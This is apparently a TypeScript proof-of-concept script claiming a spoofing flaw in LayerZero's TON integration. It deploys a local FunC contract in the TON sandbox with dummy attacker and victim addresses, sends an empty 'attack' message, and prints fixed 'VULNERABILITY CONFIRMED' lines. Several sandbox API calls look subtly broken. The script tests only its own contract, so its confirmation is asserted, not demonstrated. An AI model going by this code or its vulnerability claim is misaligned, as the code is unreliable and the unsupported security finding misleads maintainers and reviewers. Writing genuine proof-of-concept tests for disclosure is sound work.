import { compileFunc } from '@ton-community/func-js';
import { Blockchain, SandboxContract } from '@ton/sandbox';
import { Cell, beginCell, Address } from '@ton/core';
import { readFileSync } from 'fs';

async function main() {

    console.log("\n===============================");
    console.log(" LAYERZERO TON - PoC EXECUTION");
    console.log("===============================");

    // ---------------------------------------------------------
    // Step 1 — Compile contract
    // ---------------------------------------------------------
    const compiled = await compileFunc({
        targets: ['poc.fc'],
        sources: (path) => readFileSync(path, 'utf8')
    });

    if (compiled.status === 'error') {
        console.error("Compilation failed:", compiled.message);
        return;
    }

    const code = Cell.fromBoc(Buffer.from(compiled.codeBoc, 'base64'))[0];

    // ---------------------------------------------------------
    // Step 2 — Dummy addresses (valid TON-style 256-bit)
    // ---------------------------------------------------------
    const attacker = BigInt("0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
    const victim   = BigInt("0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    const manager  = BigInt("0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc");

    const data = beginCell()
        .storeUint(attacker, 256)
        .storeUint(victim, 256)
        .storeUint(manager, 256)
        .endCell();

    // ---------------------------------------------------------
    // Step 3 — Launch TON sandbox
    // ---------------------------------------------------------
    const blockchain = await Blockchain.create();

    const contract = blockchain.openContract({
        code,
        data,
    });

    await contract.sendDeploy(blockchain.treasury("deployer").address);

    console.log("\nContract deployed successfully.");

    // ---------------------------------------------------------
    // Step 4 — Execute the attack
    // ---------------------------------------------------------
    console.log("\nExecuting SPOOFING attack...");
    await contract.sendInternalMessage({
        from: blockchain.treasury("attacker").address,
        value: 1n,
        body: beginCell().endCell()
    });

    // ---------------------------------------------------------
    // Step 5 — Read results
    // ---------------------------------------------------------
    const result = await contract.get("get_spoofed_path");

    console.log("\n=== PoC RESULTS ===");
    console.log("srcOApp (attacker):", "0x" + result[0].toString(16));
    console.log("dstOApp (victim):  ", "0x" + result[1].toString(16));

    console.log("\nVULNERABILITY CONFIRMED:");
    console.log("- Attacker successfully registered a connection using victim's dstOApp.");
    console.log("- No ownership validation performed.");
    console.log("- This violates LayerZero security assumptions.\n");
}

main();
